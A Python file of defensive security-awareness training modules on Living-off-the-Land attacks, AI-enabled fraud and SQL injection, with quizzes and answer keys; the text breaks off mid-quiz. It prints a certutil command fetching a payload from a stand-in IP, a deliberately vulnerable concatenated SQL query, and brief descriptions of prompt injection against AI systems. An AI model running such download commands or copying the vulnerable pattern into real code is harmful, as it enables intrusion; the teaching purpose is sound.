"""CyberAware training content - attack modules (set C).

Modules 17-21. Educational / defensive material only.
Exports MODULES = [ {...}, ... ] consumed by the seed integrator.
Each module dict: title, description, category, order, content (HTML), questions
(list of EXACTLY 30 7-tuples: text, a, b, c, d, correct_letter, explanation).
"""


LOTL_CONTENT = """
<section>
  <h2>Living-off-the-Land (LotL) Attacks</h2>
  <p>In a Living-off-the-Land (LotL) attack, an adversary avoids dropping custom
  malware and instead abuses tools that are <strong>already installed and
  trusted</strong> on the target system. Because the binaries are signed by the
  operating system vendor and used daily by administrators, this activity blends
  into normal operations and frequently slips past signature-based antivirus.</p>
</section>

<section>
  <h3>1. How it works</h3>
  <p>Attackers chain together native utilities, scripting engines, and
  administrative frameworks to download payloads, execute code, move laterally,
  and persist. The community calls the abused binaries
  <strong>LOLBins</strong> (Living-Off-the-Land Binaries) and the scripts
  <strong>LOLScripts</strong>. The goal is to leave as few unique artifacts as
  possible so defenders have nothing to fingerprint.</p>
  <ul>
    <li><strong>PowerShell</strong> and <strong>Windows Script Host</strong> for
    in-memory, file-less execution.</li>
    <li><strong>WMI</strong> (Windows Management Instrumentation) for remote
    execution and persistence via event subscriptions.</li>
    <li><strong>PsExec</strong> and <strong>WinRM</strong> for lateral movement
    between hosts.</li>
    <li>Download proxies such as <strong>certutil</strong>, <strong>bitsadmin</strong>,
    <strong>mshta</strong>, <strong>regsvr32</strong>, and <strong>rundll32</strong>.</li>
    <li>On Linux/macOS: <strong>curl/wget</strong>, <strong>bash</strong>,
    <strong>cron</strong>, and <strong>ssh</strong> for the same purposes.</li>
  </ul>
</section>

<section>
  <h3>2. Real-world red flags</h3>
  <ul>
    <li>certutil being used to <em>download</em> a file (it is a certificate
    tool, not a downloader).</li>
    <li>Office applications (Word, Excel) spawning <strong>powershell.exe</strong>
    or <strong>cmd.exe</strong> as a child process.</li>
    <li>Encoded or obfuscated PowerShell command lines containing
    <code>-EncodedCommand</code>, <code>-nop</code>, or <code>-w hidden</code>.</li>
    <li>rundll32 or regsvr32 reaching out to the internet.</li>
    <li>Scheduled tasks or WMI event consumers created outside change windows.</li>
  </ul>
</section>

<section>
  <h3>3. Why signatures fail</h3>
  <p>The table contrasts traditional malware with the LotL approach so you can
  see why endpoint detection must shift from <em>what file ran</em> to
  <em>what behavior occurred</em>.</p>
  <table class="table">
    <thead>
      <tr><th>Aspect</th><th>Traditional malware</th><th>Living-off-the-Land</th></tr>
    </thead>
    <tbody>
      <tr><td>Artifact on disk</td><td>New, unknown .exe</td><td>Signed OS binary already present</td></tr>
      <tr><td>AV signature</td><td>Can be created</td><td>Tool is legitimate, cannot be blocked outright</td></tr>
      <tr><td>Best detection</td><td>File hash / signature</td><td>Behavioral / parent-child / command-line analysis</td></tr>
      <tr><td>Footprint</td><td>Files, registry keys</td><td>Often memory-only (file-less)</td></tr>
    </tbody>
  </table>
</section>

<section>
  <h3>4. Defenses</h3>
  <ul>
    <li>Enable <strong>PowerShell script-block and module logging</strong> plus
    Constrained Language Mode where feasible.</li>
    <li>Deploy <strong>EDR/XDR</strong> that scores process lineage and command
    lines, not just file hashes.</li>
    <li>Apply <strong>application control</strong> (WDAC, AppLocker) and consider
    blocking or restricting risky LOLBins.</li>
    <li>Practice <strong>least privilege</strong> so a compromised user cannot
    invoke admin frameworks like WMI/PsExec broadly.</li>
    <li>Alert on anomalous parent-child relationships (e.g., winword.exe spawning
    powershell.exe).</li>
  </ul>
</section>

<section class="exercise" data-exercise="code-review">
  <h3>Quick check: benign admin task or suspicious LotL activity?</h3>
  <pre class="code-block"><code>certutil.exe -urlcache -split -f http://203.0.113.10/p.txt p.exe</code></pre>
  <p>Click your answer:</p>
  <div class="exercise-options">
    <button type="button" class="btn btn-secondary" data-answer="secure">Benign</button>
    <button type="button" class="btn btn-secondary" data-answer="vulnerable" data-correct="true">Suspicious</button>
  </div>
  <p class="exercise-feedback" hidden></p>
</section>
"""

LOTL_QUIZ = [
    ("What best describes a Living-off-the-Land (LotL) attack?",
     "Abusing legitimate tools already present on the system",
     "Planting a brand-new custom executable on disk",
     "Encrypting files for ransom",
     "Flooding a server with traffic",
     "A",
     "LotL attacks abuse trusted, pre-installed binaries and scripts so the activity blends in and evades signature-based defenses."),
    ("The signed, legitimate binaries abused in LotL attacks are commonly called:",
     "Rootkits",
     "LOLBins",
     "Droppers",
     "Payloads",
     "B",
     "LOLBins (Living-Off-the-Land Binaries) are legitimate signed binaries misused for malicious purposes."),
    ("Why are LotL attacks hard for traditional antivirus to detect?",
     "They use very large files",
     "They run only at night",
     "The tools are legitimate and signed, so they cannot simply be blocked",
     "They always require physical access",
     "C",
     "Because the abused tools are legitimate OS components, AV cannot block them outright and signatures do not apply."),
    ("Which Windows tool is a certificate utility that attackers misuse to download files?",
     "explorer",
     "notepad",
     "calc",
     "certutil",
     "D",
     "certutil is meant for certificate management, but its URL-cache feature can be abused to fetch remote files."),
    ("A file-less attack primarily means the malicious code:",
     "Runs largely in memory, leaving little on disk",
     "Is stored in a hidden folder",
     "Is compressed into a ZIP",
     "Only affects cloud storage",
     "A",
     "File-less techniques execute in memory (often via scripting engines), minimizing on-disk artifacts."),
    ("Seeing winword.exe spawn powershell.exe is a red flag because:",
     "Word always uses PowerShell",
     "Office documents should not normally launch a scripting shell",
     "It is a normal update process",
     "PowerShell is malware",
     "B",
     "An Office app spawning a scripting shell is a classic sign of a malicious macro launching LotL activity."),
    ("Which PowerShell command-line flag is a common red flag for hidden, obfuscated execution?",
     "-Help",
     "-Version",
     "-EncodedCommand",
     "-NoExit",
     "C",
     "-EncodedCommand runs Base64-encoded scripts, frequently used to obfuscate malicious PowerShell."),
    ("WMI (Windows Management Instrumentation) is abused by attackers mainly for:",
     "Rendering graphics",
     "Managing printers only",
     "Compressing files",
     "Remote execution and stealthy persistence",
     "D",
     "WMI enables remote command execution and persistence through event subscriptions, making it a favorite LotL framework."),
    ("Which control most directly limits which scripts and binaries can run?",
     "Application control such as WDAC or AppLocker",
     "A louder antivirus alert",
     "Larger monitors",
     "Faster CPUs",
     "A",
     "Application allow-listing (WDAC/AppLocker) restricts execution to approved code, curbing LOLBin abuse."),
    ("PowerShell script-block logging helps defenders by:",
     "Speeding up scripts",
     "Recording the actual code that executed, even if obfuscated",
     "Encrypting the disk",
     "Blocking all PowerShell",
     "B",
     "Script-block logging captures de-obfuscated script content, giving investigators visibility into file-less attacks."),
    ("PsExec is most commonly abused for:",
     "Editing documents",
     "Playing media",
     "Lateral movement to run commands on remote hosts",
     "Defragmenting disks",
     "C",
     "PsExec executes processes on remote systems, so attackers use it to spread across a network."),
    ("Which detection strategy is most effective against LotL techniques?",
     "Blocking files by hash only",
     "Renaming system folders",
     "Disabling the firewall",
     "Behavioral analysis of process lineage and command lines",
     "D",
     "Because the binaries are legitimate, behavior-based detection (parent-child chains, suspicious arguments) is far more effective than hashes."),
    ("mshta.exe is notable in LotL attacks because it can:",
     "Execute HTML Application (HTA) content, including embedded scripts",
     "Format drives",
     "Manage user accounts",
     "Send email",
     "A",
     "mshta runs HTA files, letting attackers execute VBScript/JScript through a trusted Microsoft binary."),
    ("regsvr32 can be abused to:",
     "Print documents",
     "Execute remote scripts/code while appearing to register a DLL",
     "Adjust display brightness",
     "Compress archives",
     "B",
     "The 'Squiblydoo' technique abuses regsvr32 to run remote scriptlets via a trusted, signed binary."),
    ("Constrained Language Mode in PowerShell is designed to:",
     "Translate scripts to other languages",
     "Make scripts run faster",
     "Limit access to powerful APIs that attackers rely on",
     "Encrypt every script",
     "C",
     "Constrained Language Mode restricts the language features and .NET APIs available, reducing what malicious scripts can do."),
    ("bitsadmin is a legitimate tool for managing transfers, but attackers abuse it to:",
     "Configure monitors",
     "Compile source code",
     "Manage Active Directory",
     "Download payloads stealthily via the BITS service",
     "D",
     "Background Intelligent Transfer Service (BITS) jobs can quietly download files, making bitsadmin a download proxy for attackers."),
    ("A core advantage attackers gain from LotL is:",
     "Reduced attribution and detection because nothing looks out of place",
     "Guaranteed encryption",
     "Faster internet",
     "Automatic privilege escalation",
     "A",
     "Using native, trusted tools reduces unique indicators, helping attackers evade detection and complicate attribution."),
    ("Which is a strong proactive defense against PowerShell-based LotL?",
     "Turning off logging",
     "Enabling logging plus Constrained Language Mode and application control",
     "Giving all users admin rights",
     "Disabling the screen saver",
     "B",
     "Combining rich logging, language restrictions, and allow-listing greatly limits and exposes malicious PowerShell."),
    ("On Linux systems, which legitimate mechanism is commonly abused for persistence in LotL-style attacks?",
     "The fonts folder",
     "The desktop wallpaper",
     "cron jobs",
     "The man pages",
     "C",
     "Scheduled cron jobs can re-launch attacker code, a common Linux persistence technique using built-in tooling."),
    ("Least privilege reduces LotL impact because:",
     "It makes computers faster",
     "It blocks all scripts",
     "It encrypts the network",
     "A compromised standard user cannot freely invoke admin frameworks like WMI or PsExec",
     "D",
     "Without elevated rights, an attacker is far more limited in using powerful administrative tools for lateral movement and persistence."),
    ("rundll32.exe contacting an external IP address is suspicious because:",
     "It should only load local DLL functions, not call out to the internet",
     "It is always malware",
     "It is a video player",
     "It cannot run on Windows",
     "A",
     "rundll32 legitimately executes DLL exports locally; outbound network connections from it suggest abuse."),
    ("'Indicators of behavior' differ from 'indicators of compromise' in that they focus on:",
     "Specific file hashes",
     "Patterns of activity and tool usage rather than static artifacts",
     "Email addresses only",
     "Hardware serial numbers",
     "B",
     "Behavioral indicators describe how an attacker acts, which is more durable against LotL than static IOCs like hashes."),
    ("Which Office-related setting reduces a common LotL entry point?",
     "Increasing font size",
     "Enabling dark mode",
     "Disabling or restricting macros, especially from the internet",
     "Turning on auto-save",
     "C",
     "Malicious macros are a frequent launcher for LotL chains; blocking internet-sourced macros closes that door."),
    ("WinRM is most relevant to LotL because it provides:",
     "A music player",
     "Local disk encryption",
     "A spreadsheet engine",
     "Remote management and command execution over the network",
     "D",
     "Windows Remote Management enables remote PowerShell and command execution, useful to attackers for lateral movement."),
    ("Which statement about LOLBins is TRUE?",
     "They are legitimate binaries repurposed for malicious goals",
     "They are always unsigned",
     "They only exist on servers",
     "They cannot access the network",
     "A",
     "LOLBins are by definition legitimate, often Microsoft-signed binaries that are misused."),
    ("A WMI event consumer created outside a change window should be treated as:",
     "Routine maintenance",
     "A potential persistence mechanism worth investigating",
     "A printer setting",
     "A display preference",
     "B",
     "WMI permanent event subscriptions are a stealthy persistence method; unexpected ones warrant investigation."),
    ("Why is alerting on parent-child process relationships valuable?",
     "It measures CPU temperature",
     "It speeds up boot time",
     "Unusual lineage (e.g., excel.exe to cmd.exe) reveals LotL chains",
     "It defragments memory",
     "C",
     "Malicious LotL activity often shows abnormal process ancestry, which lineage analysis surfaces."),
    ("Network defenders can spot LotL downloads by watching for:",
     "Frequent password changes",
     "Users opening the calculator",
     "High monitor brightness",
     "Trusted utilities like certutil or bitsadmin making outbound web requests",
     "D",
     "Outbound connections from tools that normally have no reason to fetch internet content are a strong signal."),
    ("The biggest reason LotL is popular among advanced attackers is that it:",
     "Maximizes stealth by blending with legitimate administrative activity",
     "Requires no skill",
     "Is the only way to encrypt files",
     "Always crashes antivirus",
     "A",
     "Blending in with normal admin behavior is the core appeal, helping attackers remain undetected longer."),
    ("Which combined approach gives the best resilience against LotL attacks?",
     "Antivirus signatures alone",
     "Behavioral EDR, rich logging, least privilege, and application control",
     "A longer screensaver timeout",
     "Disabling all updates",
     "B",
     "Layered controls focused on behavior, visibility, privilege, and allow-listing address the file-less, trusted-tool nature of LotL."),
]


AI_CONTENT = """
<section>
  <h2>AI-Powered Attacks &amp; Deepfakes</h2>
  <p>Generative AI lowers the cost and raises the quality of attacks. Adversaries
  now use large language models to write flawless phishing lures, clone voices in
  seconds, and produce convincing fake video. This module explains how these
  techniques work, the red flags that remain, and how to defend through process
  and verification rather than gut instinct alone.</p>
</section>

<section>
  <h3>1. AI-assisted social engineering</h3>
  <p>LLMs remove the classic tells of phishing - broken grammar, awkward
  phrasing, and obvious translation errors. They can also personalize messages
  at scale by scraping public profiles, producing <strong>highly targeted spear
  phishing</strong> that reads like a trusted colleague.</p>
  <ul>
    <li>Polished, context-aware emails referencing real projects or people.</li>
    <li>Rapid, on-topic replies if you engage (the attacker is using a model).</li>
    <li>Pressure to act quickly combined with a believable pretext.</li>
  </ul>
</section>

<section>
  <h3>2. Deepfakes: voice and video</h3>
  <p>A <strong>deepfake</strong> is synthetic media generated by AI. Voice
  cloning needs only seconds of sample audio; video face-swaps can impersonate
  executives on calls. In a widely reported 2024 case, an employee was tricked
  into transferring millions after a video conference where every other
  participant was a deepfake of company leaders.</p>
  <ul>
    <li><strong>Vishing 2.0:</strong> a cloned voice of your CEO requesting an
    urgent wire transfer or gift cards.</li>
    <li><strong>Video calls:</strong> unnatural blinking, lip-sync drift,
    lighting or edge artifacts around the face, and audio that lags.</li>
    <li><strong>CEO fraud / BEC:</strong> deepfakes supercharge business email
    compromise by adding a convincing voice or face.</li>
  </ul>
</section>

<section>
  <h3>3. Other AI-enabled threats</h3>
  <table class="table">
    <thead>
      <tr><th>Technique</th><th>What the attacker does</th></tr>
    </thead>
    <tbody>
      <tr><td>Prompt injection</td><td>Hides instructions in data an AI system reads, hijacking its behavior</td></tr>
      <tr><td>Data poisoning</td><td>Corrupts training data so a model learns attacker-chosen behavior</td></tr>
      <tr><td>Model evasion</td><td>Crafts adversarial inputs that fool a classifier (e.g., spam filter)</td></tr>
      <tr><td>Synthetic identity</td><td>Generates fake faces/documents to pass onboarding checks</td></tr>
    </tbody>
  </table>
</section>

<section>
  <h3>4. Defenses</h3>
  <ul>
    <li>Use <strong>out-of-band verification</strong> for money or data requests:
    call back on a known number, never one supplied in the message.</li>
    <li>Agree on a <strong>verbal code word or challenge question</strong> for
    high-risk transactions and family emergencies.</li>
    <li>Enforce <strong>multi-person approval</strong> for wire transfers
    regardless of who appears to ask.</li>
    <li>Train staff that <strong>seeing or hearing is no longer believing</strong>;
    trust verified process over presence.</li>
    <li>For AI systems, separate untrusted data from instructions and validate
    model inputs and outputs to limit prompt injection.</li>
  </ul>
</section>

<section class="exercise" data-exercise="scenario">
  <h3>Scenario: How should you respond?</h3>
  <p><em>You receive an urgent voicemail that sounds exactly like your CEO asking
  you to wire funds to a new vendor before end of day.</em></p>
  <div class="exercise-options">
    <button type="button" class="btn btn-secondary" data-answer="unsafe">Wire the funds immediately since the voice is clearly the CEO</button>
    <button type="button" class="btn btn-secondary" data-answer="safe" data-correct="true">Call the CEO back on a known internal number to verify before doing anything</button>
  </div>
  <p class="exercise-feedback" hidden></p>
</section>
"""

AI_QUIZ = [
    ("What is a deepfake?",
     "Synthetic audio, image, or video generated by AI to imitate a real person",
     "A password that is hard to guess",
     "A type of firewall",
     "An encrypted backup",
     "A",
     "Deepfakes are AI-generated media that convincingly mimic real people's voices or appearance."),
    ("How does generative AI make phishing emails more dangerous?",
     "It makes them longer",
     "It removes grammar and spelling errors and personalizes them at scale",
     "It encrypts the email",
     "It blocks the spam filter",
     "B",
     "LLMs produce fluent, context-aware messages, eliminating classic tells and enabling convincing targeted lures."),
    ("Roughly how much sample audio can be enough for modern voice cloning?",
     "Several hours",
     "A full day of recordings",
     "Only a few seconds",
     "Cloning is impossible",
     "C",
     "Modern voice-cloning tools can produce convincing results from just a few seconds of someone's speech."),
    ("The single most reliable defense against a deepfake wire-transfer request is to:",
     "Reply to the same message",
     "Forward it to coworkers",
     "Check the email font",
     "Verify out-of-band using a known, trusted contact channel",
     "D",
     "Out-of-band verification on a trusted channel defeats impersonation regardless of how convincing the media is."),
    ("'Seeing or hearing is no longer believing' means that:",
     "Audio and video can be faked, so verification must rely on process",
     "Cameras are banned",
     "You should never use video calls",
     "Microphones are insecure",
     "A",
     "Because AI can fabricate convincing voice and video, trust must come from verified process, not from mere presence."),
    ("Prompt injection is an attack that:",
     "Floods a server with packets",
     "Hides malicious instructions in data an AI system reads to hijack its behavior",
     "Steals a laptop",
     "Cracks a password hash",
     "B",
     "Prompt injection smuggles attacker instructions into content the model processes, manipulating its output or actions."),
    ("Data poisoning targets a machine-learning model by:",
     "Overheating the GPU",
     "Encrypting the model file",
     "Corrupting its training data so it learns attacker-chosen behavior",
     "Deleting the user manual",
     "C",
     "By tampering with training data, attackers can implant biases or backdoors into the resulting model."),
    ("Which is a visual red flag of a deepfake video call?",
     "High resolution",
     "A professional background",
     "Use of a webcam",
     "Unnatural blinking, lip-sync drift, or odd edges around the face",
     "D",
     "Artifacts like inconsistent blinking, lip-sync issues, and facial edge glitches can betray synthetic video."),
    ("Deepfakes most directly amplify which existing fraud type?",
     "Business email compromise / CEO fraud",
     "Distributed denial of service",
     "SQL injection",
     "Buffer overflow",
     "A",
     "Adding a convincing voice or face makes BEC/CEO-fraud requests far more persuasive."),
    ("A strong control for high-value transfers that resists impersonation is:",
     "Single-person approval for speed",
     "Multi-person approval regardless of who appears to request it",
     "Storing the request as a screenshot",
     "Using a louder ringtone",
     "B",
     "Requiring multiple approvers means no single deepfaked request can move funds on its own."),
    ("A pre-agreed verbal code word helps because:",
     "It is easy to guess",
     "It speeds up the wire",
     "An impersonator who cannot supply it is exposed",
     "It replaces passwords",
     "C",
     "A secret challenge phrase verifies the real person; a clone or attacker will not know it."),
    ("Adversarial (model evasion) inputs are designed to:",
     "Train the model faster",
     "Improve accuracy",
     "Back up the model",
     "Fool a classifier into a wrong decision, like marking spam as safe",
     "D",
     "Carefully crafted inputs can cause ML classifiers (e.g., spam or malware filters) to misclassify."),
    ("Why are AI-written spear-phishing messages especially effective?",
     "They combine fluent language with personalization from public data",
     "They are always very short",
     "They come only by postal mail",
     "They never contain links",
     "A",
     "LLMs can tailor flawless messages to a target using scraped public information, increasing believability."),
    ("If a caller's voice sounds exactly like a family member in distress asking for money, you should:",
     "Send money immediately",
     "Hang up and call them back on their known number to confirm",
     "Wire to the number they give",
     "Post about it online",
     "B",
     "Voice cloning fuels emergency scams; verifying through a known number defeats the impersonation."),
    ("Synthetic identity fraud uses AI to:",
     "Encrypt customer records",
     "Speed up legitimate logins",
     "Generate fake faces or documents to pass identity checks",
     "Improve call quality",
     "C",
     "Attackers generate realistic but fake faces and documents to defeat onboarding and KYC checks."),
    ("To reduce prompt-injection risk in an AI application, developers should:",
     "Trust all input equally",
     "Give the model full system access",
     "Disable all logging",
     "Separate untrusted data from instructions and validate inputs/outputs",
     "D",
     "Isolating untrusted content from trusted instructions and validating I/O limits what injected text can achieve."),
    ("A polished email referencing a real internal project and urging fast action should be treated as:",
     "Potentially AI-crafted spear phishing to be verified independently",
     "Automatically safe because it is detailed",
     "Spam to ignore silently",
     "A system notification",
     "A",
     "Specific, fluent, urgent messages are now easy to mass-produce; verify such requests through a separate channel."),
    ("The 2024 Hong Kong case where a worker wired millions involved:",
     "A stolen laptop",
     "A video call in which other participants were deepfakes of executives",
     "A ransomware infection",
     "A phishing PDF",
     "B",
     "Attackers used deepfaked video of company leaders on a conference call to authorize the fraudulent transfer."),
    ("Which mindset best protects employees against AI-enabled fraud?",
     "Trust requests that look and sound authentic",
     "Only worry about written messages",
     "Verify high-risk requests through process, no matter how convincing",
     "Assume video calls cannot be faked",
     "C",
     "Process-based verification is essential because authenticity of voice and video can no longer be assumed."),
    ("AI lowers the barrier to entry for attackers mainly by:",
     "Requiring expensive hardware for everyone",
     "Eliminating the need for targets",
     "Making attacks slower",
     "Automating high-quality content and impersonation at scale",
     "D",
     "Generative tools let less-skilled actors produce convincing lures and media quickly and cheaply."),
    ("A good policy for vendor bank-detail changes in the AI era is to:",
     "Confirm via a previously known phone number before updating records",
     "Accept changes by email if formatted well",
     "Trust any voicemail from a manager",
     "Update immediately to avoid delay",
     "A",
     "Callback verification on a trusted number prevents AI-assisted BEC from redirecting payments."),
    ("Which statement about deepfake audio is most accurate?",
     "It is always easy to detect by ear",
     "It can be convincing enough that ear-based detection is unreliable",
     "It only works in English",
     "It cannot mimic intonation",
     "B",
     "Cloned voices can closely match tone and cadence, so listeners should not rely on recognition alone."),
    ("Watermarking and provenance standards for media aim to:",
     "Make files larger",
     "Encrypt all videos",
     "Help verify whether content is authentic or AI-generated",
     "Block all editing",
     "C",
     "Content provenance and watermarking help establish authenticity and flag synthetic media."),
    ("During a suspicious live video call, a useful verification tactic is to:",
     "Assume it is real if the face matches",
     "Increase the volume",
     "End all future calls",
     "Ask the person to perform an unexpected action or answer a private question",
     "D",
     "Real-time deepfakes can struggle with unexpected actions or private knowledge, helping expose them."),
    ("Why is employee security awareness training increasingly vital against AI threats?",
     "Many AI attacks target human judgment, which training and process strengthen",
     "Technical filters alone now catch everything",
     "Training stops all deepfakes from being made",
     "It replaces the need for MFA",
     "A",
     "Since AI-enabled attacks exploit human trust, well-trained staff following verification process are a key defense."),
    ("Adversarial machine learning is the study of:",
     "Making models train faster",
     "How attackers manipulate ML models and how to defend them",
     "Designing user interfaces",
     "Database indexing",
     "B",
     "Adversarial ML covers attacks like evasion and poisoning along with the defenses against them."),
    ("A red flag during a text chat that may indicate an AI-driven scam bot is:",
     "Slow, thoughtful replies",
     "Occasional typos from a human",
     "Instant, always-on-topic responses combined with pressure to act",
     "A normal greeting",
     "C",
     "Rapid, consistently on-message replies under time pressure can indicate an automated, model-driven operator."),
    ("The safest first step when an executive emails you to buy gift cards urgently is to:",
     "Buy them and send the codes",
     "Forward it to the whole team",
     "Reply asking which store",
     "Verify the request directly with the executive through a known channel",
     "D",
     "Gift-card requests are a classic fraud pattern; independent verification stops impersonation, AI-assisted or not."),
    ("Overall, the most durable defense posture against AI-powered attacks is:",
     "Layered verification processes plus awareness and technical controls",
     "Relying on spotting fakes by eye and ear",
     "Banning all email",
     "Hoping attackers lack the tools",
     "A",
     "Because detection by sense is unreliable, durable defense combines verified process, trained people, and technical safeguards."),
    ("A deepfake-enabled scam differs from older phishing mainly in that it:",
     "Always uses postal mail",
     "Adds convincing synthetic voice or video to the deception",
     "Requires no computer",
     "Only targets executives",
     "B",
     "The defining escalation is realistic AI-generated voice/video that makes impersonation far more believable than text alone."),
]


SQLI_CONTENT = """
<section>
  <h2>SQL Injection &amp; Application-Layer Attacks</h2>
  <p>Application-layer attacks target the logic of web applications rather than
  the network. The most damaging classic example is <strong>SQL Injection
  (SQLi)</strong>, where untrusted input is interpreted as database commands.
  This module shows the vulnerable-versus-secure pattern so you can recognize
  and remediate the flaw - it does not teach how to exploit live systems.</p>
</section>

<section>
  <h3>1. How SQL injection works</h3>
  <p>The root cause is mixing <em>code and data</em>: user input is concatenated
  directly into an SQL statement, so a crafted value changes the query's meaning.
  The fix is to keep input as data using <strong>parameterized (prepared)
  statements</strong>, which let the database driver bind values safely.</p>
  <div class="code-compare">
    <pre class="code-block vulnerable"><code># VULNERABLE: input concatenated into the query
email = request.form["email"]
query = "SELECT * FROM users WHERE email = '" + email + "'"
db.execute(query)
# A crafted value can alter the WHERE clause logic</code></pre>
    <pre class="code-block secure"><code># SECURE: parameterized query (input stays data)
email = request.form["email"]
query = "SELECT * FROM users WHERE email = ?"
db.execute(query, (email,))
# The driver binds the value; it is never parsed as SQL</code></pre>
  </div>
</section>

<section>
  <h3>2. Common SQLi variants</h3>
  <table class="table">
    <thead>
      <tr><th>Variant</th><th>Idea</th></tr>
    </thead>
    <tbody>
      <tr><td>In-band (error/UNION)</td><td>Results returned directly in the app response</td></tr>
      <tr><td>Blind (boolean/time)</td><td>No data shown; attacker infers from true/false responses or delays</td></tr>
      <tr><td>Out-of-band</td><td>Data exfiltrated over a separate channel such as DNS</td></tr>
      <tr><td>Second-order</td><td>Malicious input stored, then triggered by a later query</td></tr>
    </tbody>
  </table>
</section>

<section>
  <h3>3. Other application-layer attacks</h3>
  <ul>
    <li><strong>Cross-Site Scripting (XSS):</strong> untrusted input reflected
    into HTML runs as script in the victim's browser. Defend with output
    encoding and a Content Security Policy.</li>
    <li><strong>Cross-Site Request Forgery (CSRF):</strong> tricks a logged-in
    user's browser into sending unwanted requests. Defend with anti-CSRF tokens
    and SameSite cookies.</li>
    <li><strong>Command injection:</strong> input passed to a system shell.
    Defend by avoiding shells and using safe APIs with argument arrays.</li>
    <li><strong>Insecure deserialization &amp; SSRF:</strong> abuse of object
    parsing or server-side requests; validate and restrict both.</li>
  </ul>
</section>

<section>
  <h3>4. Defenses (defense in depth)</h3>
  <ul>
    <li><strong>Parameterized queries / prepared statements</strong> as the
    primary fix; use safe ORM methods.</li>
    <li><strong>Input validation</strong> with allow-lists for type, length, and
    format - as a complement, not a replacement.</li>
    <li><strong>Least-privilege database accounts</strong> so a flaw cannot drop
    tables or read everything.</li>
    <li><strong>Stored-procedure care, escaping as a last resort,</strong> and a
    <strong>Web Application Firewall</strong> for additional monitoring.</li>
    <li>Disable detailed SQL error messages in production.</li>
  </ul>
</section>

<section class="exercise" data-exercise="code-review">
  <h3>Quick check: secure or vulnerable?</h3>
  <pre class="code-block"><code>cursor.execute("SELECT * FROM accounts WHERE id = " + request.args["id"])</code></pre>
  <p>Click your answer:</p>
  <div class="exercise-options">
    <button type="button" class="btn btn-secondary" data-answer="secure">Secure</button>
    <button type="button" class="btn btn-secondary" data-answer="vulnerable" data-correct="true">Vulnerable</button>
  </div>
  <p class="exercise-feedback" hidden></p>
</section>
"""

SQLI_QUIZ = [
    ("What is the primary defense against SQL injection?",
     "Using parameterized (prepared) statements",
     "Encrypting all tables",
     "Hiding the database server",
     "Renaming columns",
     "A",
     "Parameterized statements separate code from data so user input can never be interpreted as SQL."),
    ("The fundamental root cause of SQL injection is:",
     "Slow networks",
     "Mixing untrusted input (data) with SQL code",
     "Weak Wi-Fi passwords",
     "Too many database indexes",
     "B",
     "SQLi arises when user-supplied data is treated as part of the SQL command rather than as a bound value."),
    ("Which code pattern is vulnerable to SQL injection?",
     "Binding values with placeholders",
     "Using an ORM's parameterized methods",
     "Concatenating user input directly into the query string",
     "Validating input length",
     "C",
     "String concatenation of user input into a query lets crafted values change the query's logic."),
    ("Blind SQL injection is characterized by:",
     "Returning all data instantly",
     "Encrypting the response",
     "Crashing the web server",
     "Inferring information from true/false responses or time delays rather than direct output",
     "D",
     "In blind SQLi no data is shown directly; the attacker deduces it from the application's behavior."),
    ("Why does parameterization stop injection?",
     "The driver binds input as a value, so it is never parsed as SQL code",
     "It encrypts the SQL",
     "It hides error messages",
     "It speeds up the query",
     "A",
     "Prepared statements send the query structure and the data separately, so input cannot alter the command."),
    ("Applying least privilege to the application's database account helps by:",
     "Making queries faster",
     "Limiting damage if injection occurs, e.g., preventing table drops",
     "Encrypting the network",
     "Removing the need for input validation",
     "B",
     "A restricted account confines what a successful injection can read or destroy."),
    ("Input validation in defense against SQLi should be treated as:",
     "The only protection needed",
     "Unnecessary if you have a firewall",
     "A helpful complement to, not a replacement for, parameterized queries",
     "Harmful to security",
     "C",
     "Allow-list validation reduces risk but is not sufficient alone; parameterization is the core fix."),
    ("Cross-Site Scripting (XSS) primarily lets an attacker:",
     "Drop database tables",
     "Disable TLS",
     "Overflow a stack buffer",
     "Run arbitrary JavaScript in a victim's browser",
     "D",
     "XSS executes script in the victim's browser context, enabling session theft and other abuse."),
    ("The main defense against reflected/stored XSS is:",
     "Context-aware output encoding plus a Content Security Policy",
     "Parameterized SQL",
     "Disabling cookies",
     "Renaming variables",
     "A",
     "Encoding untrusted data on output (and a CSP) prevents it from being interpreted as active markup or script."),
    ("Cross-Site Request Forgery (CSRF) tricks the victim's browser into:",
     "Revealing the database schema",
     "Sending an unwanted authenticated request to a site they are logged into",
     "Overflowing a buffer",
     "Decrypting TLS traffic",
     "B",
     "CSRF abuses the victim's existing session to perform actions they did not intend."),
    ("Which pair best defends against CSRF?",
     "Longer passwords and CAPTCHAs",
     "Bigger servers and caching",
     "Anti-CSRF tokens and SameSite cookies",
     "Disabling JavaScript globally",
     "C",
     "Unpredictable anti-CSRF tokens plus SameSite cookie restrictions stop forged cross-site requests."),
    ("A UNION-based SQL injection attempts to:",
     "Slow the server down",
     "Disable logging",
     "Encrypt the database",
     "Append a second query result set to the original output",
     "D",
     "UNION-based injection combines attacker-controlled SELECT results with the legitimate query's output."),
    ("Second-order SQL injection occurs when:",
     "Malicious input is stored first and triggers a flaw in a later query",
     "The attack happens twice at once",
     "Two servers are attacked",
     "The query runs faster the second time",
     "A",
     "In second-order SQLi, stored data is safely saved but unsafely used by a subsequent query."),
    ("Command injection happens when user input is:",
     "Stored in a cookie",
     "Passed unsafely to a system shell or OS command",
     "Encrypted with AES",
     "Displayed in a table",
     "B",
     "Command injection arises when untrusted input reaches an OS shell, letting attackers run system commands."),
    ("A safer way to call external programs that avoids command injection is to:",
     "Build one big shell string from input",
     "Run everything as root",
     "Use APIs that pass arguments as an array without invoking a shell",
     "Disable logging",
     "C",
     "Passing arguments directly (no shell interpretation) prevents shell metacharacters in input from being executed."),
    ("Detailed SQL error messages in production are risky because they:",
     "Slow the database",
     "Improve SEO",
     "Encrypt the response",
     "Reveal query structure and schema that aid attackers",
     "D",
     "Verbose database errors leak information useful for crafting injection, so they should be suppressed in production."),
    ("Server-Side Request Forgery (SSRF) abuses an application to:",
     "Make the server send attacker-chosen requests to internal/other systems",
     "Render fonts",
     "Compress images",
     "Sort database rows",
     "A",
     "SSRF coerces the server into making requests, often reaching internal services the attacker could not otherwise access."),
    ("Insecure deserialization is dangerous because untrusted serialized data can:",
     "Only slow the app",
     "Be crafted to instantiate objects that lead to code execution or tampering",
     "Never be exploited",
     "Improve performance",
     "B",
     "Deserializing attacker-controlled data can manipulate application state or trigger code execution."),
    ("A Web Application Firewall (WAF) in the context of SQLi is best seen as:",
     "A complete replacement for secure code",
     "A database backup tool",
     "An additional monitoring/mitigation layer, not a substitute for fixing code",
     "An encryption protocol",
     "C",
     "A WAF can block some attacks but is bypassable; parameterized code remains the real fix."),
    ("Using an ORM helps reduce SQLi when developers:",
